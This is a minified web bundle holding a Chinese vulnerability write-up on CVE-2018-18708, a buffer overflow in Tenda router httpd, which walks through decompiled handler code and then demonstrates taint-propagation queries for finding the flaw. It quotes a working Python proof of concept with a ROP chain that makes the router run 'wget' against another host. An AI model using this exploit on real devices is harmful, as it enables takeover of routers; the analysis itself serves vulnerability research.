"use strict";(self.webpackChunktest=self.webpackChunktest||[]).push([[237],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>f});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var o=a.createContext({}),p=function(e){var t=a.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(o.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,o=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),d=p(n),m=r,f=d["".concat(o,".").concat(m)]||d[m]||u[m]||i;return n?a.createElement(f,s(s({ref:t},c),{},{components:n})):a.createElement(f,s({ref:t},c))}));function f(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,s=new Array(i);s[0]=m;var l={};for(var o in t)hasOwnProperty.call(t,o)&&(l[o]=t[o]);l.originalType=e,l[d]="string"==typeof e?e:r,s[1]=l;for(var p=2;p<i;p++)s[p]=n[p];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},6822:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>s,default:()=>u,frontMatter:()=>i,metadata:()=>l,toc:()=>p});var a=n(7462),r=(n(7294),n(3905));const i={sidebar_position:5},s="CVE-2018-18708: \u817e\u8fbe\u8def\u7531\u5668\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e",l={unversionedId:"\u4f7f\u7528\u6837\u4f8b/cve-2018-18708/index",id:"\u4f7f\u7528\u6837\u4f8b/cve-2018-18708/index",title:"CVE-2018-18708: \u817e\u8fbe\u8def\u7531\u5668\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e",description:"0x00 \u6f0f\u6d1e\u4ecb\u7ecd",source:"@site/docs/\u4f7f\u7528\u6837\u4f8b/cve-2018-18708/index.md",sourceDirName:"\u4f7f\u7528\u6837\u4f8b/cve-2018-18708",slug:"/\u4f7f\u7528\u6837\u4f8b/cve-2018-18708/",permalink:"/\u4f7f\u7528\u6837\u4f8b/cve-2018-18708/",draft:!1,editUrl:"https://github.com/TianGongLab/poc_docs/tree/main/docs/\u4f7f\u7528\u6837\u4f8b/cve-2018-18708/index.md",tags:[],version:"current",sidebarPosition:5,frontMatter:{sidebar_position:5},sidebar:"tutorialSidebar",previous:{title:"VQL \u51fd\u6570\u529f\u80fd\u63cf\u8ff0",permalink:"/vql_function"},next:{title:"CVE-2019\u201317621: D-Link DIR-859 \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e",permalink:"/\u4f7f\u7528\u6837\u4f8b/cve-2019-17621-d-link-dir-859/"}},o={},p=[{value:"0x00 \u6f0f\u6d1e\u4ecb\u7ecd",id:"0x00-\u6f0f\u6d1e\u4ecb\u7ecd",level:2},{value:"0x01 \u56fa\u4ef6\u903b\u8f91\u5206\u6790",id:"0x01-\u56fa\u4ef6\u903b\u8f91\u5206\u6790",level:2},{value:"0x02 \u6f0f\u6d1e\u5206\u6790",id:"0x02-\u6f0f\u6d1e\u5206\u6790",level:2},{value:"0x03 \u6f0f\u6d1e\u626b\u63cf",id:"0x03-\u6f0f\u6d1e\u626b\u63cf",level:2},{value:"3.1 \u7834\u58f3\u5e73\u53f0",id:"31-\u7834\u58f3\u5e73\u53f0",level:3},{value:"3.11 \u67e5\u8be2\u5165\u95e8",id:"311-\u67e5\u8be2\u5165\u95e8",level:4},{value:"3.22 \u67e5\u8be2\u8fc7\u7a0b",id:"322-\u67e5\u8be2\u8fc7\u7a0b",level:4},{value:"3.23\u7ed3\u679c\u9a8c\u8bc1",id:"323\u7ed3\u679c\u9a8c\u8bc1",level:4}],c={toc:p},d="wrapper";function u(e){let{components:t,...i}=e;return(0,r.kt)(d,(0,a.Z)({},c,i,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"cve-2018-18708-\u817e\u8fbe\u8def\u7531\u5668\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e"},"CVE-2018-18708: \u817e\u8fbe\u8def\u7531\u5668\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e"),(0,r.kt)("h2",{id:"0x00-\u6f0f\u6d1e\u4ecb\u7ecd"},"0x00 \u6f0f\u6d1e\u4ecb\u7ecd"),(0,r.kt)("p",null,"CVE-2018-18708\uff0c\u591a\u6b3eTenda\u4ea7\u54c1\u4e2d\u7684httpd\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u9020\u6210\u62d2\u7edd\u670d\u52a1\uff08\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff09\u3002"),(0,r.kt)("p",null,"\u9644\u4ef6\uff1a"),(0,r.kt)("p",null,(0,r.kt)("a",{target:"_blank",href:n(4529).Z},"httpd 991088")),(0,r.kt)("h2",{id:"0x01-\u56fa\u4ef6\u903b\u8f91\u5206\u6790"},"0x01 \u56fa\u4ef6\u903b\u8f91\u5206\u6790"),(0,r.kt)("p",null,"\u9996\u5148httpd\u4f1a\u8fdb\u884c\u7aef\u53e3\u548c ip\u7ed1\u5b9a\uff0c\u7136\u540e\u4f1a\u8c03\u7528",(0,r.kt)("inlineCode",{parentName:"p"},"initWeb"),"\u51fd\u6570\u5bf9\u8def\u7531\u8fdb\u884c\u7ed1\u5b9a\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},'if ( initWeb_2E9EC(v9) >= 0 )\n{\n  ....\n  ....\n  ....\n}\nelse\n{\n  puts("main -> initWebs failed");\n  return -1;\n}\n')),(0,r.kt)("p",null,"\u5728",(0,r.kt)("inlineCode",{parentName:"p"},"initWeb"),"\u4e2d\u9996\u5148\u8fdb\u884c\u4e86",(0,r.kt)("inlineCode",{parentName:"p"},"handler"),"\u7684\u7ed1\u5b9a\uff0c\u8fd9\u91cc\u7ed1\u5b9a\u4e86",(0,r.kt)("inlineCode",{parentName:"p"},"/goform"),"\uff0c",(0,r.kt)("inlineCode",{parentName:"p"},"/cgi-bin"),"\u7b49\u8def\u7531\uff0c\u540e\u9762\u7684",(0,r.kt)("inlineCode",{parentName:"p"},"websFormHandler"),"\u5373\u5bf9\u5e94\u7684\u5904\u7406\u51fd\u6570"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},'if ( sub_29510(port, retries) >= 0 )\n  {\n    sub_179A8(&unk_DC618, 0, 0, R7WebsSecurityHandler, 1);\n    sub_179A8("/goform", 0, 0, websFormHandler, 0);\n    sub_179A8("/cgi-bin", 0, 0, webs_Tenda_CGI_BIN_Handler, 0);\n    sub_179A8(&unk_DC618, 0, 0, websDefaultHandler, 2);\n    init_register();\n    sub_179A8("/", 0, 0, sub_2ECD0, 0);\n    return 0;\n  }\n  else\n  {\n    printf("%s %d: websOpenServer failed\\n", "initWebs", 499);\n    return -1;\n  }\n')),(0,r.kt)("p",null,"\u5728\u540e\u7eed\u7684",(0,r.kt)("inlineCode",{parentName:"p"},"init_register")," \u5bf9\u8fdb\u5165handler\u540e\u5206\u53d1\u8fdb\u884c\u5904\u7406\u7684\u51fd\u6570\u8fdb\u884c\u4e86\u6ce8\u518c"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},'int sub_42378()\n{\n  int v0; // r0\n\n  sub_10120("TendaGetLongString", aspTendaGetLongString);\n  sub_10120("aspTendaGetStatus", aspTendaGetStatus);\n  regist_handlers_form("updateUrlLog", updateUrlLog);\n  regist_handlers_form("SysStatusHandle", fromSysStatusHandle);\n  regist_handlers_form("GetWanStatus", formGetWanStatus);\n  regist_handlers_form("GetSysInfo", formGetSysInfo);\n  regist_handlers_form("GetWanStatistic", formGetWanStatistic);\n  regist_handlers_form("GetAllWanInfo", formGetAllWanInfo);\n  regist_handlers_form("GetWanNum", formGetWanNum);\n  sub_10120("aspGetWanNum", aspGetWanNum);\n  regist_handlers_form("getPortStatus", formGetPortStatus);\n  regist_handlers_form("GetSystemStatus", formGetSystemStatus);\n  regist_handlers_form("GetRouterStatus", formGetRouterStatus);\n  regist_handlers_form("setNotUpgrade", formsetNotUpgrade);\n  sub_10120("aspGetCharset", aspGetCharset);\n  regist_handlers_form("WizardHandle", fromWizardHandle);\n  regist_handlers_form("fast_setting_get", form_fast_setting_get);\n  regist_handlers_form("fast_setting_pppoe_get", form_fast_setting_pppoe_get);\n  regist_handlers_form("fast_setting_wifi_set", form_fast_setting_wifi_set);\n  regist_handlers_form("fast_setting_pppoe_set", form_fast_setting_pppoe_set);\n  regist_handlers_form("getWanConnectStatus", formGetWanConnectStatus);\n  regist_handlers_form("getProduct", GetProduct);\n  regist_handlers_form("fast_setting_internet_set", form_fast_setting_internet_set);\n  regist_handlers_form("usb_get", form_usb_get);\n  v0 = regist_handlers_form("SysToolpassword", SysToolpassword);\n')),(0,r.kt)("p",null,"\u5373",(0,r.kt)("inlineCode",{parentName:"p"},"POST goform/setMacFilterCfg")," \u4f1a\u8fdb\u4e0b\u9762\u6ce8\u518c\u7684",(0,r.kt)("inlineCode",{parentName:"p"},"formSetMacFilterCfg"),"\u51fd\u6570\u4e2d\u8fdb\u884c\u5904\u7406"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},' regist_handlers_form("setMacFilterCfg", formSetMacFilterCfg);\n')),(0,r.kt)("h2",{id:"0x02-\u6f0f\u6d1e\u5206\u6790"},"0x02 \u6f0f\u6d1e\u5206\u6790"),(0,r.kt)("p",null,"\u6839\u636e\u516c\u5f00\u7684\u6f0f\u6d1e\u4fe1\u606f\uff0c\u6f0f\u6d1e\u89e6\u53d1\u662f\u5728",(0,r.kt)("inlineCode",{parentName:"p"},"sub_C24C0"),"\u51fd\u6570\u4e2d\u7684strcpy\u5904\uff0c\u770b\u7684\u51fa\u6765\u662f\u5c06a1\u76f4\u63a5\u6ca1\u6709\u5224\u65ad\u957f\u5ea6\u62f7\u8d1d\u5230\u4e86a2+32\u4e2d\u3002\u6211\u4eec\u7ee7\u7eed\u5411\u4e0a\u8ddf\u8e2a\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"\u786e\u5b9a\u8be5\u6f0f\u6d1e\u7684\u6570\u636e\u8f93\u5165\u70b9\u6765\u6e90\u4e8e\u54ea\u91cc\u3002")),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("p",{parentName:"li"},"\u786e\u8ba4a1\u7684\u957f\u5ea6\u662f\u8981\u5927\u4e8ea2+32\u7684\u3002"),(0,r.kt)("p",{parentName:"li"},(0,r.kt)("img",{src:n(5694).Z,width:"931",height:"624"})))),(0,r.kt)("p",null,"\u6211\u4eec\u5411\u4e0a\u8fdb\u884c\u4ea4\u53c9\u5f15\u7528\u8ddf\u8e2a\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u91ccv12\u4e5f\u5c31\u662f\u4e0a\u4e2a\u51fd\u6570\u7684a2\u7684\u5927\u5c0f\u662f\u56fa\u5b9a\u7684\uff0c\u5927\u5c0f\u4e3a176\u3002"),(0,r.kt)("p",null," ",(0,r.kt)("img",{src:n(1841).Z,title:" =895x",width:"895",height:"227"})),(0,r.kt)("p",null,"\u518d\u5411\u4e0a\u8ddf\u8e2a\uff0c\u6211\u4eec\u53d1\u73b0\u4e00\u5f00\u59cb\u7684strcpy\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u5b57\u7b26\u4e32\u6765\u81ea\u4e8e\u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c"),(0,r.kt)("p",null," ",(0,r.kt)("img",{src:n(8857).Z,width:"601",height:"89"})),(0,r.kt)("p",null,"\u7ed3\u5408\u516c\u5f00poc\uff0c\u6211\u4eec\u4ecepoc\u4e2d\u5bfb\u627e\u4e00\u4e0b\u662f\u4e0d\u662f\u5305\u542b\u4e86\u8fd9\u4e2a\u5b57\u6bb5"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'import requests\nfrom pwn import *\n \ncmd="wget 192.168.11.35"\nlibc_base = 0xff58c000\nsystem = libc_base + 0x5A270\nmov_r0_ret_r3 = libc_base + 0x40cb8\npop_r3 = libc_base + 0x18298\n \npayload = \'a\'*176\npayload+= p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd\n \nurl = "http://192.168.2.3/goform/setMacFilterCfg"\ncookie = {"Cookie":"password=12345"}\ndata = {"macFilterType": "black", "deviceList": "\\r" + payload}\nresponse = requests.post(url, cookies=cookie, data=data)\nresponse = requests.post(url, cookies=cookie, data=data)\nprint(response.text)\n')),(0,r.kt)("p",null,"\u53d1\u73b0",(0,r.kt)("inlineCode",{parentName:"p"},"deviceList\u662fpost\u8bf7\u6c42\u4e2d\u7684data\u91cc\u9762json\u6570\u636e\u7684\u4e00\u4e2a\u5b57\u6bb5\uff0c\u90a3\u4e48\u987a\u7406\u6210\u7ae0sub_2BABC"),"\u7684\u4f5c\u7528\u5176\u5b9e\u5c31\u662f\u4ecejson\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5c06\u7ed3\u679c\u4fdd\u5b58\u5728\u8fd4\u56de\u503c\u4e2d\u3002"),(0,r.kt)("h2",{id:"0x03-\u6f0f\u6d1e\u626b\u63cf"},"0x03 \u6f0f\u6d1e\u626b\u63cf"),(0,r.kt)("p",null,"\u6211\u4eec\u8fd9\u91cc\u67e5\u8be2\u601d\u8def\u662f\u627e\u5230source\u70b9",(0,r.kt)("inlineCode",{parentName:"p"},"FUN_0002ba8c")," \u51fd\u6570\u7684\u8fd4\u56de\u8ffd\u548csink\u70b9",(0,r.kt)("inlineCode",{parentName:"p"},"strcpy")," \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e24\u4e2a\u53d8\u91cf\u4e4b\u95f4\u6240\u6709\u7684\u8def\u5f84\uff0c\u56e0\u4e3astrcpy\u7b2c2\u4e2a\u53c2\u6570\u5982\u679c\u6765\u81ea\u4e8e",(0,r.kt)("inlineCode",{parentName:"p"},"FUN_0002ba8c"),"\u7684\u8fd4\u56de\u503c\u7684\u8bdd\u5f88\u53ef\u80fd\u4f1a\u9020\u6210\u6808\u6ea2\u51fa"),(0,r.kt)("h3",{id:"31-\u7834\u58f3\u5e73\u53f0"},"3.1 \u7834\u58f3\u5e73\u53f0"),(0,r.kt)("h4",{id:"311-\u67e5\u8be2\u5165\u95e8"},"3.11 \u67e5\u8be2\u5165\u95e8"),(0,r.kt)("p",null,"\u9996\u5148\u6d45\u6d45\u8fdb\u884c\u4e00\u4e2acypher\u8bed\u8a00\u5165\u95e8 ",(0,r.kt)("a",{parentName:"p",href:"https://zhuanlan.zhihu.com/p/398323729"},"https://zhuanlan.zhihu.com/p/398323729")),(0,r.kt)("p",null,"\u7b80\u5355\u6765\u8bf4\u67e5\u8be2\u7684\u6a21\u5f0f\u5982\u4e0b"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},'MATCH (n:\u8282\u70b9\u7c7b\u578b{\u5c5e\u6027:"\u67d0\u79cd\u5c5e\u6027"})-[\u5173\u7cfb]-(m) RETURN *\n')),(0,r.kt)("p",null,"\u7528\u6211\u4eec\u8981\u67e5\u8be2\u7684source\u70b9\u505a\u4e00\u4e2a\u4f8b\u5b50\uff0c\u8be5\u8bed\u53e5\u5c31\u662f\u6765\u67e5\u8be2\u51fd\u6570\u540d\u4e3a",(0,r.kt)("inlineCode",{parentName:"p"},"FUN_0002ba8c"),"\u7684\u51fd\u6570\u8282\u70b9"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},'MATCH (n:function{name:"FUN_0002ba8c"}) RETURN n\n')),(0,r.kt)("h4",{id:"322-\u67e5\u8be2\u8fc7\u7a0b"},"3.22 \u67e5\u8be2\u8fc7\u7a0b"),(0,r.kt)("p",null,"\u901a\u8fc7\u7528\u6237\u6587\u6863\u53ef\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5e73\u53f0\u63d0\u4f9b\u7684",(0,r.kt)("inlineCode",{parentName:"p"},"call VQL.taintPropagation")," \u6765\u8fdb\u884c\u6f0f\u6d1e\u67e5\u8be2"),(0,r.kt)("p",null,"\u9996\u5148\u627e\u5230source\u70b9\u7684id\uff0c\u6211\u4eec\u5bfb\u627e\u7684\u6761\u4ef6\u5982\u4e0b\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"\u5c5e\u6027\u4e3aidentifier\uff0c\u4e5f\u5c31\u662f\u53d8\u91cf\u7684\u8282\u70b9"),(0,r.kt)("li",{parentName:"ol"},"\u8c03\u7528\u8be5\u53d8\u91cf\u7684\u51fd\u6570\u4e3a",(0,r.kt)("inlineCode",{parentName:"li"},"FUN_0002ba8c"),'\uff08callee = "FUN_0002ba8c" )'),(0,r.kt)("li",{parentName:"ol"},"\u8be5\u53d8\u91cf\u662f\u8c03\u7528\u51fd\u6570\u7684\u8fd4\u56de\u503c(index = -1)")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},'MATCH (n:identifier) WHERE (n.callee = "FUN_0002ba8c" AND n.index=-1 ) WITH collect(id(n)) AS sourceSet \nRETURN sourceSet\n')),(0,r.kt)("p",null,"\u540c\u7406\u6211\u4eec\u53ef\u4ee5\u627e\u5230",(0,r.kt)("inlineCode",{parentName:"p"},"sink"),"\u70b9\uff0c\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u7684\u662fstrcpy\u7684\u7b2c2\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5index = 1\uff0c\u8fd9\u91ccindex\u7684\u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},'MATCH (n:identifier) WHERE (n.callee = "strcpy" AND n.index=1 ) WITH collect(id(n)) AS sinkSet\nRETURN sinkSet\n')),(0,r.kt)("p",null,"\u6700\u540e\u6211\u4eec\u628a\u8fd9\u4e09\u4e2a\u547d\u4ee4\u7528",(0,r.kt)("inlineCode",{parentName:"p"},"WITH`"),"\u8fde\u63a5\u4e00\u4e0b"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},'MATCH (n:identifier) WHERE (n.callee = "FUN_0002ba8c" AND n.index=-1 ) WITH collect(id(n)) AS sourceSet\nMATCH (n:identifier) WHERE (n.callee = "strcpy" AND n.index=1 ) WITH sourceSet,collect(id(n)) AS sinkSet\nCALL VQL.taintPropagation(sourceSet,sinkSet, [], [])\nYIELD taintPropagationPath RETURN taintPropagationPath\n')),(0,r.kt)("p",null,"\u4ee5\u4e0a\u5c31\u5927\u529f\u544a\u6210\u4e86"),(0,r.kt)("h4",{id:"323\u7ed3\u679c\u9a8c\u8bc1"},"3.23\u7ed3\u679c\u9a8c\u8bc1"),(0,r.kt)("p",null,"\u901a\u8fc7\u6267\u884c\u4e0a\u9762\u7684\u67e5\u8be2\u8bed\u53e5\uff0c\u53ef\u4ee5\u4ece\u5e73\u53f0\u7684\u8bed\u53e5\u5206\u6790\u5904\u67e5\u770b\u7ed3\u679c\uff0c\u67e5\u8be2\u5230\u4e86\u6f0f\u6d1e\u51fd\u6570\u7684\u6267\u884c\u6d41\u3002\u6570\u636e\u6d41\u4ece7\u5904\u6d41\u54111\u5904\u3002"),(0,r.kt)("p",null," ",(0,r.kt)("img",{src:n(7983).Z,width:"2016",height:"532"})))}u.isMDXComponent=!0},4529:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/files/c847d716-1fd0-46c8-926d-9bbf2f014018-a5b79cf56c19f3d7239304aebfa101fd.false"},8857:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/1e054597-ddc5-491e-90a1-7d064bc93b19-9fd2b3b2cc9cedb0bcd5a74319576266.png"},1841:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2d3cd699-e307-458d-8173-3493e84dd4ff-7c0deed979f73951e01a44e7e2d4e323.png"},7983:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/3a0165d6-0a15-4beb-a9a9-c97ea2ca5bb8-6a551472979229cdce22b9ab7db16355.png"},5694:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/8a020bf7-2a72-4218-a0c0-4401550a2e95-976333ddf871f825c736bf1805b686cf.png"}}]);